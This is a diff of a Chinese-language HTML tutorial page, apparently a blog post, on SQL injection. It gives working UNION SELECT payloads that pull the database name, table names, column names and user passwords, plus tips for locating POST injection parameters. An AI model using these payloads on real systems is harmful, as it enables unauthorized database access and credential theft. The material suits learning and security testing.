@@ -284,6 +284,7 @@
 </ol>
 <p>在输入框里输入<code>gifts&#39; union select 1,database(),3,4#</code>即可拿到数据库名。<br>拿到数据库名后，接下来拿表名：<br>在输入框里输入<code>1&#39; union select 1,database(),table_name,4 from information_schema.tables where table_schema=database()#</code>得到表名。<br>接下来分析表字段(假设有一张表，名为user)：<br>输入<code>1&#39; union select 1,database(),column_name,4 from information_schema.columns where table_name=&#39;user&#39; and table_schema=database()#</code><br>指出当前数据库中的名为user的表中的字段名<br>假设有字段名为username和password<br>则输入<code>1&#39;union select 1,username,password,4 from user #</code><br>可以拿到用户名和密码！！！</p>
 <h2 id="POST型SQL注入漏洞"><a href="#POST型SQL注入漏洞" class="headerlink" title="POST型SQL注入漏洞"></a>POST型SQL注入漏洞</h2><p>提交的内容在url上没有显示，是post型与get型的区别之一<br>方法：提交，F12看“网络”Network部分，再点提交，找php文件！<br>首先看到<code>请求URL</code>,即是post注入的地址，<br>再找到最下面form data,里面有post注入的参数（字段）</p>
+<p>判断一下注入类型：并不是所有的注入都要加单引号闭合！<br>如果注入位置的数据类型为整型则不用加单引号</p>
 
             </div>
 
